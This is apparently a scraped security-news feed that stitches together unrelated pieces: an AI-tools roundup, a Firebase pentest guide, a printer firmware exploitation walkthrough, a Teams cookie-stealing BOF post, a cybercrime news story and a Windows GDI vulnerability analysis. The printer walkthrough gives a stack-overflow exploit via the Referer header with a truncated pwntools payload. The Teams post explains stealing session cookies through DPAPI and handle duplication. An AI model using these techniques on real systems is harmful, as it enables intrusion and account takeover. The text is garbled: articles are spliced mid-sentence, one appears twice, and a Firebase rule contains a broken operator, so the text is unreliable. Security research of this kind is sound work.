efficiency improvement.Patch Wednesday: AI-Driven Automated Vulnerability RemediationVulnerability remediation is a continuous burden in enterprise security operations. The “Patch Wednesday” project demonstrates how to disrupt this process using generative AI. The core idea of the tool is:· Input: Provide a CVE number and the vulnerable code repository.· Processing: A privately deployed LLM analyzes the CVE description, understands the root cause of the vulnerability, and analyzes it in the context of the code.· Output: Automatically generates a code patch to fix the vulnerability for developers to review and apply.This approach promises to shorten hours or even days of manual remediation work to just a few minutes, dramatically increasing the efficiency of security response.OpenSource Security LLM: Democratizing Threat Modeling CapabilitiesTraditionally, advanced security activities like threat modeling required senior experts. The OpenSource Security LLM project explores how to train and utilize small, open-source LLMs to popularize these capabilities. The presenters will demonstrate how to use these lightweight models to:· Assist in Threat Modeling: Automatically generate potential threat scenarios based on a system description.· Automate Code Review: Analyze code snippets from a security perspective to identify potential vulnerabilities.This foreshadows a future where every developer and security engineer can deploy an “AI Security Assistant” locally, thereby integrating security capabilities more broadly into the early stages of the development lifecycle.IV. Conclusion and Outlook: Towards a Mature AI Security EcosystemThe eight tools showcased at the Black Hat Europe 2025 Arsenal clearly delineate the future trends of AI security tools. From systematic red team attack platforms to fine-grained LLM governance tools, and AI-powered automated defense solutions, traditional security tools are being comprehensively reshaped and accelerated towards maturity by AI:Systematization of AI Red Teaming and Attack Simulation: Attack tools are evolving from single-function utilities to platform-based, automated, and intelligent systems, with corresponding cyber ranges for adversarial simulation also emerging.Refinement of LLM Security and Governance: Assessment and defense tools for prompt injection, data security, and multi-turn conversational safety are becoming more mature, forming a critical part of governance.Automation of AI-Powered Defense: AI is being deeply integrated into traditional security processes like vulnerability management and threat modeling to enhance efficiency and scalability.Just like open-source large models, open-source AI security tools will become a core driving force for innovation in the security industry. The tools featured at Black Hat will greatly promote the dissemination and iteration of cutting-edge technologies. For all security practitioners, now is a critical moment not only to learn how to “;defend against AI” but also to learn how to “leverage AI” to revolutionize existing security practices. This new arms race centered around artificial intelligence has only just begun.https://www.blackhat.com/eu-25/arsenal/schedule/index.html#track/ai-ml--data-science]]></content:encoded></item><item><title>Quick writeup for what to check when you see Firebase in a pentest</title><link>https://projectblack.io/blog/firebase-security-fundamentals/</link><author>/u/ezzzzz</author><category>netsec</category><pubDate>Mon, 3 Nov 2025 09:04:37 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[If you’re a new developer building your first Firebase app and thinking about security or you're a penetration tester who’s come across a Firebase application during an engagement, this article is for you.Firebase is a group of cloud based services offered by Google. Most people describe the platform as a Backend as a service.In a traditional web application, your backend server enforces access control. For example, in a to-do app  you may want to prevent users from reading other people's to-do items, the backend code might perform a check to make sure that the requested  actually belongs to the requesting user:@app.route('/todo/<todo_id>')
def get_todo(todo_id):
    todo = get_todo_by_id(todo_id)

    if not todo:
        abort(404, "Todo not found.")

    # Authorisation check: only allow access if the todo belongs to the user
    if str(todo.user_id) != str(request.user.id):
        abort(403, "You are not authorised to access this todo item.")

    return jsonify(todo)With Firebase, there isn’t a traditional backend server. Instead, the database is exposed directly to the client, and access control must be enforced through  rather than server-side code.This needs to be tailored to what application use cases you need to support but generally speaking here are some sane defaults to consider:Users should not be able to list all documents in a collection (database table)This is akin to restricting users from performing a  queryA list operation retrieves all documents in a collection along with the  for each documentFor a given , users should only be able to get, update, replace, or delete records that belong to themself!If you're a penetration tester these are test cases you want to consider checking.Here's what can happen if you don't implement any security rules.Let's take a look at our victim - a classic todo list app. You login, and the app lets you add and remove your own todo lists items. Although the frontend does not provide any buttons to interact with anyone else's Todo list items, we can connect directly to underlying Firebase data store using the same SDK to try perform these actions.In all Firebase apps, the  required by the Firebase SDK needs to be exposed.If you search for  or  in the Browser dev tools you'll normally find the details we need to connect directly.It might look alarming that an  is exposed but in Firebase projects this is expected."None of the Firebase-related APIs use an API key as  for calling the API. The API key passed with the API call is only used for  of the Firebase project or app."We can use firepwn to exploit the lack of security rules. This is a project that Project Black has contributed to.Intialise the configuration as follows (the parameters look a bit different because the tool uses the  SDK).To find collection names to query we can search the Frontend code again for  or alternatively inspect network traffic when using the app.After logging in, we can perform a  operation by performing a  without specifying a .In this case, we're able to retrieve todo list items created by other users!Overwriting/updating our victim's todo item is as simple as changing the operation to  and specifying a  to update.Firebase storage is secured the same way with security rules. In the absence of any security rules you're similarly able to retrieve all files stored in the storage and overwrite them as desired.Implementing Security RulesTo fix our broken access control issue the solution is to check that the userId from authentication matches the userId stored in the document.request.auth.uid == resource.data.userIdTo support rule, our todo list items also need to have an associated userId stored in the document.rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /todos/{todoId} {
      // Allow users to read and write only their own todos
      allow read, write: if request.auth != null \
        && request.auth.uid == resource.data.userId;
      // Allow creating todos if authenticated, only allow creating todos
      // owned by the authenticated user
      allow create: if request.auth != null \
        %& request.auth.uid == request.resource.data.userId;
    }
  }
}Trying the same requests now returns this error in firepwn.Security controls implemented in the frontend can be bypassed.By understanding this you can avoid the same vulnerabilities we see over and over in Firebase apps.]]></content:encoded></item><item><title>A week in security (October 27 &amp;#8211; November 2)</title><link>https://www.malwarebytes.com/blog/news/2025/11/a-week-in-security-october-27-november-2</link><author></author><category>threatintel</category><pubDate>Mon, 3 Nov 2025 08:05:00 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Last week on Malwarebytes Labs:We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline.

```

**Key Discovery:** The three zlib components (zlibRo, zlibRw, and zlib2Rw) are concatenated together and can be extracted sequentially using Python’s zlib library.

### Part 3: Loading the Firmware into IDA Pro

Now comes the fun part: reverse engineering the actual code. We loaded the extracted segments into IDA Pro for analysis.

#### Step 1: Load the Kernel Segment

Start by loading `flash_V1.14_KernelRoSrcAdr_0x40419000_0x22a8c.bin`. Critical detail: **select ARM Little-endian processor type**.

#### Step 2: Configure Memory Layout

Set both the ROM start address and loading address to match the KernelRo address (conveniently also included in the filename: `0x40419000`).

Add a RAM section at address `0x42DA0000` (derived from RamHighAdr in the firmware), with a size of `0x100000`. This might not be 100% accurate, but it’s a reasonable starting point.

#### Step 3: Disassemble

Choose 32-bit code when prompted:

#### Step 4: Load Additional Segments

With the initial file loaded, add the remaining segments via **File → Load File → Additional binary file…**

**Important:** Ensure you’re specifying the **Loading address** field, not “Loading segment” (which uses a different address type).

#### Step 5: Set Segment Permissions

After adding each segment, verify that permissions are correctly set:

- **Read-only segments (Ro)**: Mark as RX (Read + Execute)
- **Read-write segments (Rw)**: Mark as RWX (Read + Write + Execute)

This ensures IDA properly analyzes the different code sections.

#### Step 6: Complete the Memory Map

Repeat for all remaining sections. Your final memory map should look like this with 6 segments:

#### Step 7: Reanalyze

Once all segments are loaded, reanalyze the program:

- Option 1: Use the bottom-right hidden menu
- Option 2: Navigate to **Options → General → Analysis → Reanalyze Program**

Also run the built-in IDA **Find Functions** plugin to identify function boundaries:

### Part 4: Finding the Vulnerability

Now that we have the firmware properly loaded, we can start hunting for interesting functions. Our initial approach was to:

1. Map out the HTTP request handling code
2. Identify input validation routines
3. Look for unsafe string operations

As part of our exploitation chain, we drew inspiration from Rapid7’s CVE-2024-51979: stack based buffer overflow in the validation logic for the CSRFToken header.

#### The Vulnerable Code

Here’s the minimal vulnerable code path:

```
int __fastcall decode_csrftoken(int http_req, char *b64_token) { ... v26 = extract_header_value(http_req, "Referer", v37, 2048) + 1; // Extract Referer header ... v34 = strstr(v37, "//"); strcpy(v48, (v34 + 2)); r6_42 = strstr(v48, "/"); memset(buff64, 0, sizeof(buff64)); memcpy(buff64, v48, r6_42 - v48); // ← BUFFER OVERFLOW HERE v33 = buff64; ... }
```

**The Bug:** If the `Referer` header contains `http://AAA...AAA/boc/boc.html`, the `AAA...AAA` portion is copied into `buff64` without bounds checking. By sending a Referer header with more than 256 ‘A’ characters, we overflow the buffer.

#### Understanding the Call Stack

When execution reaches this vulnerable code, the call stack looks like:

```
handle_http_request (0x40D365D4) └─ decode_params (0x408F4F8A) └─ decode_csrftoken (0x40CAC154) ← Overflow happens here
```

##### The Stack Layout

Here’s what the stack looks like when we trigger the overflow:

```
Higher addresses │ ┌───────────────────────────────────────────────┐ │ │ Frame #1 (decode_csrftoken) │ │ ├───────────────────────────────────────────────┤ | │ .... │ | │ PADDING_BUFFER | | | (0xd4 bytes from overflown buffer) │ | │ .... │ | ├───────────────────────────────────────────────┤ │ SP_after_f1 → │ saved R4 │ │ ├───────────────────────────────────────────────┤ │ │ saved R5 │ │ ├───────────────────────────────────────────────┤ │ │ saved R6 │ │ ├───────────────────────────────────────────────┤ │ │ saved R7 │ │ ├───────────────────────────────────────────────┤ │ │ saved R8 │ │ ├───────────────────────────────────────────────┤ │ │ saved R9 ← [1] callback pointer │ │ ├───────────────────────────────────────────────┤ │ │ saved R10 │ │ ├───────────────────────────────────────────────┤ │ │ saved R11 │ │ ├───────────────────────────────────────────────┤ │ │ saved R12 │ │ ├───────────────────────────────────────────────┤ │ │ saved PC │ │ └───────────────────────────────────────────────┘ │ ┌───────────────────────────────────────────────┐ │ │ Frame #2 (decode_params) │ │ ├───────────────────────────────────────────────┤ | │ .... │ | │ PADDING_BUFFER (0x80 bytes) │ | │ .... │ | ├───────────────────────────────────────────────┤ │ SP_after_f2 → │ saved R4 │ │ ├───────────────────────────────────────────────┤ │ │ saved R5 │ │ ├───────────────────────────────────────────────┤ │ │ saved R6 ← [2] first argument │ │ ├───────────────────────────────────────────────┤ │ │ saved R7 │ │ ├───────────────────────────────────────────────┤ │ │ saved R8 │ │ ├───────────────────────────────────────────────┤ │ │ saved PC │ │ └───────────────────────────────────────────────┘ │ Lower addresses
```

#### The Exploitation Strategy

When parameter decoding fails in `decode_params`, the code executes a callback function to return an error. The callback pointer is stored in `R9` of the `decode_csrftoken` stack frame (marked \[1\] above), and the first argument is in `R6` of the `decode_params` stack frame (marked \[2\]).

Here’s the relevant code in `handle_http_request`:

```
int __fastcall handle_http_request( _DWORD *http_req, void (__fastcall *callback)(int, int, int, int, int, char *), char *a3, char *a4, int a5) { sub_40D50B14(); sub_408F46FA(http_req, v9, v10, v11); if ( sub_40D3655E(http_req, v12, v13, v14) ) return 0; decode_params(v28, http_req, v15, v16); // ← Calling decode_params sub_409A15B0(&v26, v28, 0xCu, v17); if ( !sub_40D363C0(http_req) ) { sub_40D364DC(http_req); if ( !v19 ) { sub_40D32FDE(http_req, "X-Frame-Options", "DENY"); if ( !a3 ) a3 = ""; sub_408F2840(http_req, a3, a4, v20); sub_408F2F48(http_req, a5); sub_409A15B0(v25, v27, 8u, v21); executeCallback(http_req, callback, a5, v26, v25[0], v25[1]); // ← Execute callback sub_408F29D6(http_req, v22, v23, v24); } } sub_408F5180(v26, *v27, *&v27[4], v28); return 0; } int __fastcall executeCallback( int r0_0, int (__fastcall *callback)(int, int, int, int, int, void *), int a3, int a4, int a5, int a6) { if ( sub_408F27C4(r0_0, a1) == -1 ) print_input_perhaps(a1, "ERROR\n", v10); sub_40D59E04(v13, 256, "", a1); sub_408F5236(r0_0, v13); v11 = callback(r0_0, a4, a5, a6, a3, &unk_408F3084); // ← Executing callback sub_408F5236(r0_0, ""); return v11; }
```

**Our exploit strategy:**

1. Overflow the buffer to overwrite the `callback` pointer with our target function address
2. Control the first argument to that function
3. Execute arbitrary code

### Part 5: Crafting the Exploit

For our proof of concept, we wanted to display text on the printer’s LCD screen. Through reverse engineering, we found a perfect function at address `0x4054B380`:

```
int __fastcall display_wrapper_a1_30s(char *stringToDisplay) { _BYTE v3[4]; // [sp+10h] [bp-Ch] BYREF _BYTE v4[8]; // [sp+14h] [bp-8h] BYREF sub_4047DCCE(0, 0, 160, 128, 0, 0, 0); sub_4047E040(v3, 255, 255); sub_4047E040(v4, 255, 0); stringToDisplay[16] = 0; display_something(0, 0, stringToDisplay, 1, 0, v3, v4, 160); return sub_40969246(); }
```

This function:

- Takes a string as its first argument (which we control via `R6`)
- Displays it on the printer’s LCD
- Has a 16-character limit (perfect for fitting our text **)**) `STAR LABS!`

### The Final Exploit Payload

```
#!/usr/bin/env python3 from urllib.parse import quote, unquote from pwn import * session = requests.Session() session.verify = False buffer_ = flat( { # Pops at the end of decode_csrf # 40CAC508 BD E8 F0 9F POP.W {R4-R12,PC} 212: [ # Returns from decode_csrf # zlibRo:40CAC508 BD E8 F0 9F POP.W {R4-R12,PC} 0x62626262, # R4 0x62626262, # R5 0x62626262, # R6 0x62626262, # R7 0x402B866C, # R8 / R0 at 408F5140: IMPORTANT, maybe HTTP struct?

```

### The Result

When we send this crafted HTTP request with the malicious Referer header, the printer displays our message:

**Success!** We’ve achieved arbitrary code execution on a network-connected printer without any authentication.

## Impact Assessment

### What Could an Attacker Actually Do?

While our proof of concept just displays a message, a real attacker could do lots more.

### For Users

1. **Update firmware immediately** to version 1.19 or later (if available)
2. **Disable SNMP** if not needed: Access printer settings → Network → SNMP → Disable
3. **Change default password** to a strong, unique password
4. **Isolate printer network**\- Consider placing printers on a separate VLAN
5. **Disable firmware updates over HTTP**\- Use secure update mechanisms only
6. **Monitor printer access logs** for suspicious activity

### For Vendors

1. **Require authentication for SNMP queries**\- Implement SNMPv3 with authentication
2. **Don’t derive passwords from serial numbers**\- Use true random password generation
3. **Require authentication for firmware updates**\- Never allow unauthenticated firmware changes
4. **Implement rollback protection**\- Prevent downgrading to vulnerable firmware versions
5. **Use secure coding practices**\- Implement bounds checking on all string operations
6. **Enable ASLR and DEP**\- Make exploitation more difficult
7. **Implement proper input validation**\- Sanitize all HTTP headers

## Conclusion

This research demonstrates that even seemingly innocuous devices like office printers can harbor serious security vulnerabilities. The chain of vulnerabilities we discovered, from unauthenticated SNMP access to predictable passwords to buffer overflows. It shows how multiple small oversights can combine into a critical security failure.

The broader lesson? **Security cannot be an afterthought in IoT and embedded devices.** Every network-connected device is a potential attack vector, and manufacturers must treat security as a first-class design requirement.

As we continue to connect more devices to our networks, we must remain vigilant about their security posture. That $150 printer might just be the weakest link in your security infrastructure.]]></content:encoded></item><item><title>Steal MS Teams app cookies</title><link>https://tierzerosecurity.co.nz/2025/11/03/teams-cookies-bof.html</link><author>/u/clod81</author><category>netsec</category><pubDate>Sun, 2 Nov 2025 22:31:39 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[
          03 November 2025
          Claudio Contin
        Beacon Object File (BOF) to steal Microsoft Teams cookies
          A research on stealing Microsoft Teams cookies has been recently released: https://blog.randorisec.fr/ms-teams-access-tokens/. The research shows that once the Teams cookies are obtained, these allows to interact with the Teams, Skype and Graph APIs to read and send Teams messages as the victim.
        
          The researcher found that the Microsoft Teams application uses the  (Chromium based process) to embed the browser window within the application. Upon authentication, Teams stores the cookies into a SQLite database, in a similar way as browsers do.
          The main differences between a modern Chromium based browser and Teams is that Chromium enhanced the way they protect the key used to encrypt the cookies, by invoking a COM-based IElevator service running with SYSTEM privileges, rather than simply rely on the current user DPAPI master key. This service checks that the caller is the legitimate browser process by inspecting the executable location is the default secure installation path where low privileged users have no write access by default.
          Instead, the web views for the Teams application still rely on the current user DPAPI master key to encrypt the key used for encryption of the actual cookies. In case of the browser, the only known ways to obtain the state key for cookies encryption is to run within the browser context or by having local administrator/SYSTEM privileges on the host.
        
          The awesome Cookie-Monster-BOF allows to obtain the encryption key and the cookies files while running in the context of a browser process. The tool searches for the right process which has an existing handle opened to the cookies files, invokes the COM service to decrypt the key for cookies encryption, and downloads the cookies file.
        
          The Teams cookies research post mentions the limitation of not being able to read or copy the cookies file, due to being locked by the Teams application while running. When remembering the Cookie-Monster-BOF logic, we thought we could easily repurpose the BOF to target Teams instead. Rather than killing the Teams process, if we are able to run within the process itself (DLL/COM hijack anyone?), we can simply search for the web view child process which has an existing handle open to the cookies file, duplicate it, use it to read the file content and download it, while also decrypting the key used for cookies encryption with the master key of the current user.
        
          Note that in the case of a browser, in order to decrypt the state key, we are forced to operate within the legitimate browser process, due to being otherwise unable to interact with the COM service and decrypt the key.
        
          In the Teams case, this requirement does not apply. The BOF could be run within the context of any processes which run with the same privileges of the Teams process (current user). A process unrelated to Teams which opens handles to the web view Teams child processes, could be seen as an IOC, but technically nothing stops to achieve the same goal. This Gist can be used for this purpose. Note that in this instance, all the web view processes are queried and the cookies file downloaded, including ones unrelated to Teams. The encryption key will only work against the Teams cookies.
        
          The BOF takes no argument and can be run within any C2 that supports BOF.
        
          The decryption logic is 100% the same as per the Cookie-Monster-BOF and remains unchanged.

The gang targeted mostly small to mid-sized businesses, and they were an early pioneer of so-called “man-in-the-browser” attacks, malware that can silently intercept any data that victims submit in a web-based form.Once inside a victim company’s accounts, the Jabber Zeus crew would modify the firm’s payroll to add dozens of “money mules,” people recruited through elaborate work-at-home schemes to handle bank transfers. The mules in turn would forward any stolen payroll deposits — minus their commissions — via wire transfers to other mules in Ukraine and the United Kingdom.The 2012 indictment targeting the Jabber Zeus crew named MrICQ as “,” and said this person handled incoming notifications of newly compromised victims. The Department of Justice (DOJ) said MrICQ also helped the group launder the proceeds of their heists through electronic currency exchange services.Two sources familiar with the Jabber Zeus investigation said Rybtsov was arrested in Italy, although the exact date and circumstances of his arrest remain unclear. A summary of recent decisions (PDF) published by the Italian Supreme Court states that in April 2025, Rybtsov lost a final appeal to avoid extradition to the United States.According to the mugshot website , Rybtsov arrived in Nebraska on October 9, and was being held under an arrest warrant from the U.S. Federal Bureau of Investigation (FBI).The data breach tracking service Constella Intelligence found breached records from the business profiling site bvdinfo[.]com showing that a 41-year-old Yuriy Igorevich Rybtsov worked in a building at 59 Barnaulska St. in Donetsk. Further searching on this address in Constella finds the same apartment building was shared by a business registered to Vyacheslav “Tank” Penchukov, the leader of the Jabber Zeus crew in Ukraine.Vyacheslav “Tank” Penchukov, seen here performing as “DJ Slava Rich” in Ukraine, in an undated photo from social media. is founder of myNetWatchman, a threat intelligence company based in Georgia that began tracking and disrupting the Jabber Zeus gang in 2009. myNetWatchman had secretly gained access to the Jabber chat server used by the Ukrainian hackers, allowing Baldwin to eavesdrop on the daily conversations between MrICQ and other Jabber Zeus members.Baldwin shared those real-time chat records with multiple state and federal law enforcement agencies, and with this reporter. Between 2010 and 2013, I spent several hours each day alerting small businesses across the country that their payroll accounts were about to be drained by these cybercriminals.Those notifications, and Baldwin’s tireless efforts, saved countless would-be victims a great deal of money. In most cases, however, we were already too late. Nevertheless, the pilfered Jabber Zeus group chats provided the basis for dozens of stories published here about small businesses fighting their banks in court over six- and seven-figure financial losses.Baldwin said the Jabber Zeus crew was far ahead of its peers in several respects. For starters, their intercepted chats showed they worked to create a highly customized botnet directly with the author of the original Zeus Trojan — Evgeniy Mikhailovich Bogachev, a Russian man who has long been on the FBI’s “Most Wanted” list. The feds have a standing $3 million reward for information leading to Bogachev’s arrest.Evgeniy M. Bogachev, in undated photos.The core innovation of Jabber Zeus was an alert that MrICQ would receive each time a new victim entered a one-time password code into a phishing page mimicking their financial institution. The gang’s internal name for this component was “,” (the video below from myNetWatchman shows it in action). Jabber Zeus would actually re-write the HTML code as displayed in the victim’s browser, allowing them to intercept any passcodes sent by the victim’s bank for multi-factor authentication.“These guys had compromised such a large number of victims that they were getting buried in a tsunami of stolen banking credentials,” Baldwin told KrebsOnSecurity. “But the whole point of Leprechaun was to isolate the highest-value credentials — the commercial bank accounts with two-factor authentication turned on. They knew these were far juicier targets because they clearly had a lot more money to protect.”Baldwin said the Jabber Zeus trojan also included a custom “backconnect” component that allowed the hackers to relay their bank account takeovers through the victim’s own infected PC.“The Jabber Zeus crew were literally connecting to the victim’s bank account from the victim’s IP address, or from the remote control function and by fully emulating the device,” he said. “That trojan was like a hot knife through butter of what everyone thought was state-of-the-art secure online banking at the time.”Although the Jabber Zeus crew was in direct contact with the Zeus author, the chats intercepted by myNetWatchman show Bogachev frequently ignored the group’s pleas for help. The government says the real leader of the Jabber Zeus crew was , a 38-year Ukrainian man with Russian citizenship who went by the hacker handle “.”Alleged Evil Corp leader Maksim “Aqua” Yakubets. Image: FBIThe Jabber chats intercepted by Baldwin show that Aqua interacted almost daily with MrICQ, Tank and other members of the hacking team, often facilitating the group’s money mule and cashout activities remotely from Russia.The government says Yakubets/Aqua would later emerge as the leader of an elite cybercrime ring of at least 17 hackers that referred to themselves internally as “.” Members of Evil Corp developed and used the  (a.k.a. ) trojan, which helped them siphon more than $100 million from hundreds of victim companies in the United States and Europe.This 2019 story about the government’s $5 million bounty for information leading to Yakubets’s arrest includes excerpts of conversations between Aqua, Tank, Bogachev and other Jabber Zeus crew members discussing stories I’d written about their victims.

We promptly reported these issues to Microsoft, and they were addressed in the  updates in May, July, and August 2025.These are the vulnerabilities:CVE-2025-30388, rated important and considered more likely to be exploited;CVE-2025-53766, classified as critical severity and may allow remote attackers to execute arbitrary code on affected systems;CVE-2025-47984, also rated important and can result in the unauthorized disclosure of sensitive information over the network.Vulnerability disclosures such as these highlight the need for proactive measures to mitigate potential risks. Our purpose in publishing this blog after security fixes were implemented is to further raise awareness of these vulnerabilities and provide Windows users with defensive insights and mitigation recommendations. In the following sections, we detail the findings of our fuzzing campaign, which targeted Windows  using the  format and led to the discovery of these security vulnerabilities.Geometry Gone Rogue – CVE-2025-30388We found three separate crashes related to the processing of ,  and  records. All three cases have a common root cause: another record sets the stage for exploitation. However, the outcome varies depending on which additional records are processed during the execution. Our current analysis focuses on the crash involving the  record.Multiple access violation exceptions occurred in the ScanOperation::AlphaMultiply_sRGB(), ScanOperation::Blend_sRGB_sRGB_MMX() and EpAntialiasedFiller::OutputSpan() functions within version  of the  module. These exceptions were triggered when the system attempted to read or write memory at the end of a  bytes heap block, or while attempting to access reserved but unallocated memory.This vulnerability could potentially allow a remote attacker to perform out-of-bounds read or write memory operations using a specially crafted  metafile.  shows the decompiled source code of the ScanOperation::AlphaMultiply_sRGB() function at the time of the crash. Decompiled source code of the affected ScanOperation::AlphaMultiply_sRGB() function.In our crash sample, which serves as a proof of concept (PoC) for reproducing a vulnerability, an  record is located before the  record within the metafile. This record clears the output coordinate space and initializes it with a background color and transparency, as defined by its  field. The field contains an  object specifying red, green, blue, and alpha components. This detail is significant because it allows an attacker to control the value written to memory during exploitation.  shows the affected  record.EmfPlusClear clear = {
    .Type     = 0x4009,
    .Flags    = 0x0102,

    .DataSize = 0x00000030,
    .Color    = 0xaabbccff  // Value written to memory
};
Listing 1. Sample EmfPlusClear record showing the value written to memory.Further investigation revealed that the  record handler uses the  function to allocate a heap block to store 4000 bytes (0xFA0). This buffer is then populated with the specified  object, which undergoes alpha multiplication by the  function during the processing of the  record.Note that the loop counter stored in the  register begins at 0x950. As each iteration writes a 4-byte object into the target buffer at , the function writes out-of-bounds after 1000 bytes, when the counter reaches 0x567. This behavior can be observed in  which shows an excerpt from the crash analysis.0:000> g

Listing 3. Sample EmfPlusSetTSClip record containing invalid RECT objects.Processing invalid  objects results in a heap-based buffer overflow that may allow an attacker to perform out-of-bounds memory operations.

Listing 5. Stack trace showing an access violation in the ScanOperation::AlphaDivide_sRGB() function.In a bitmap image, a scan-line is one horizontal row of pixels. Processing an image line by line means handling one scan-line at a time, from left to right and top to bottom. Further analysis showed that the EpScanBitmap::NextBuffer() function never verified that the number of scan-lines it was about to process fit in the destination bitmap, meaning that the function could be tricked into reading or writing past the bottom edge of an image if a call requested more scan-lines than existed.Assuming that the bitmap allocated for thumbnail generation is 100×100 (0x64 × 0x64) pixels, the rectangle data in the PoC metafile deliberately pushes the scan position past the bottom edge of the bitmap and triggers the out-of-bounds write. Any one of those rectangles forces the rasterizer (which converts vector graphics into a pixel grid) to process scan-lines whose Y coordinate is well beyond the 0-99 range of the bitmap.Microsoft fixed this vulnerability within the EpScanBitmap::NextBuffer() function in version 10.0.26100.4946 of , as shown in , by adding a check to detect when the requested number of scan-lines exceeds the height of the bitmap. The function now automatically trims the requested scan-lines to fit within the remaining rows, preventing any out-of-bounds access, as shown in . Decompiled source code of the patched GEpScanBitmap::NextBuffer() function.This vulnerability was addressed with KB5063878 in the August 2025 Patch Tuesday as a critical severity remote code execution vulnerability tracked as CVE-2025-53766. Notably, this vulnerability requires no privileges or user interaction and can be exploited remotely over a network, making it a high-risk threat to web services that parse specially crafted metafiles.Unfinished Business – CVE-2025-48984We identified a fifth crash while processing an  record, which immediately appeared to be related to the CVE-2022-35837 vulnerability.

Listing 6. Stack trace showing an access violation in the StringLengthWorkerW() function.The stack trace suggests that the issue may lie with the  function, which performs a length check on user-controlled data and assumes the input is a null-terminated string. However, if the provided string is not null-terminated, the function may read beyond the allocated buffer, leading to potential information disclosure.The decompiled source code of the  function shown in  demonstrates that CVE-2022-35837 was addressed by assigning values to the  and  fields through a calculated offset stored in the  variable, if their respective fields are non-null. Decompiled source code of the  function. shows the affected  metafile record.

Listing 8. Raw EMR_STARTDOC record showing the calculated offsets.The out-of-bounds read occurs because the  function validates string offsets inside the record. A specially crafted metafile may pad the first string in the  field so that it nearly reaches the end of the record. After copying that string, the code advances its internal cursor beyond that point, but the next validation for the  field still treats the supplied offset as if it were relative to the original base of the record.This discrepancy allows an attacker to provide a value that passes the  function while actually pointing outside the heap block. Because no null terminator is found, the  function continues reading into adjacent memory, exposing its contents. The crash sample intensifies the issue by setting the  field to just 0x120 (288) bytes, causing the allocated buffer to be smaller than the embedded data and guaranteeing an over-read.Microsoft fixed this vulnerability within the  handler function in version 10.0.26100.4652 of  by correcting the offset arithmetic. The patched function now converts the pointer back to an offset relative to the start of the record before revalidating it and applies the same logic to the  field. Therefore, the check matches the data that will be dereferenced, as shown in . Decompiled source code of the patched  function.This bug was addressed with KB5062553 in the  as an important severity information disclosure vulnerability tracked as CVE-2025-47984. MSRC classified it as CWE-693: Protection Mechanism Failure, which in this case really means that the security fix to address CVE-2022-35837 was incomplete.We discovered vulnerabilities in Windows  that could have serious implications for system security. Our extensive investigation into  files shows that staying ahead of potential threats requires continuous diligence and adaptation. By sharing these findings, we hope to raise awareness and provide valuable insights and recommendations to enhance security for all Windows users.Security vulnerabilities can persist undetected for years, often resurfacing due to incomplete fixes. A particular information disclosure vulnerability, despite being formally addressed with a security patch, remained active for years due to the original issue receiving only a partial fix. This example underscores a basic conundrum for researchers: introducing a vulnerability is often easy, fixing it can be difficult, and verifying that a fix is both thorough and effective is even more challenging.These issues highlight why comprehensive and continuous security testing, using verification techniques that must be constantly updated and improved, is crucial. This effort can be greatly enhanced by close collaboration between vendors and security researchers, including sharing planned fixes with the researchers who initially reported the issue. Such a collaborative approach adds an extra layer of review, helping to catch potential gaps early and strengthens the overall security of the software ecosystem.]]></content:encoded></item><item><title>Drawn to Danger: Windows Graphics Vulnerabilities Lead to Remote Code Execution and Memory Exposure</title><link>https://research.checkpoint.com/2025/drawn-to-danger-windows-graphics-vulnerabilities-lead-to-remote-code-execution-and-memory-exposure/</link><author>samanthar@checkpoint.com</author><category>vulns</category><pubDate>Sun, 2 Nov 2025 13:53:17 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[Check Point Research (CPR) identified three security vulnerabilities in the _Graphics Device Interface (_ `GDI`) in Windows. We promptly reported these issues to Microsoft, and they were addressed in the _Patch Tuesday_ updates in May, July, and August 2025.

These are the vulnerabilities:

Vulnerability disclosures such as these highlight the need for proactive measures to mitigate potential risks. Our purpose in publishing this blog after security fixes were implemented is to further raise awareness of these vulnerabilities and provide Windows users with defensive insights and mitigation recommendations. In the following sections, we detail the findings of our fuzzing campaign, which targeted Windows `GDI` using the `EMF` format and led to the discovery of these security vulnerabilities.

We found three separate crashes related to the processing of `EmfPlusDrawString`, `EmfPlusFillRects` and `EmfPlusFillClosedCurve` records. All three cases have a common root cause: another record sets the stage for exploitation. However, the outcome varies depending on which additional records are processed during the execution. Our current analysis focuses on the crash involving the `EmfPlusDrawString` record.

Multiple access violation exceptions occurred in the `ScanOperation::AlphaMultiply_sRGB()`, `ScanOperation::Blend_sRGB_sRGB_MMX()` and `EpAntialiasedFiller::OutputSpan()` functions within version `10.0.26100.3037` of the `GdiPlus.dll` module. These exceptions were triggered when the system attempted to read or write memory at the end of a `4000/0xFA0` bytes heap block, or while attempting to access reserved but unallocated memory.

This vulnerability could potentially allow a remote attacker to perform out-of-bounds read or write memory operations using a specially crafted `EMF+` metafile. _Figure 1_ shows the decompiled source code of the `ScanOperation::AlphaMultiply_sRGB()` function at the time of the crash.

_Figure 1._ Decompiled source code of the affected `ScanOperation::AlphaMultiply_sRGB()` function.

In our crash sample, which serves as a proof of concept (PoC) for reproducing a vulnerability, an `EmfPlusClear` record is located before the `EmfPlusDrawString` record within the metafile. This record clears the output coordinate space and initializes it with a background color and transparency, as defined by its `Color` field. The field contains an `EmfPlusARGB` object specifying red, green, blue, and alpha components. This detail is significant because it allows an attacker to control the value written to memory during exploitation. _Listing 1_ shows the affected `EmfPlusClear` record.

```
EmfPlusClear clear = { .Type = 0x4009, .Flags = 0x0102, .Size = 0x0000003c, .DataSize = 0x00000030, .Color = 0xaabbccff // Value written to memory };
```

Listing 1. Sample EmfPlusClear record showing the value written to memory.

Further investigation revealed that the `EmfPlusClear` record handler uses the `EpScanBitmap::Start()` function to allocate a heap block to store 4000 bytes (0xFA0). This buffer is then populated with the specified `EmfPlusARGB` object, which undergoes alpha multiplication by the `AlphaMultiply_sRGB()` function during the processing of the `EmfPlusDrawString` record.

Note that the loop counter stored in the `ebx` register begins at 0x950. As each iteration writes a 4-byte object into the target buffer at `ecx + edx`, the function writes out-of-bounds after 1000 bytes, when the counter reaches 0x567. This behavior can be observed in _Listing 2_ which shows an excerpt from the crash analysis.

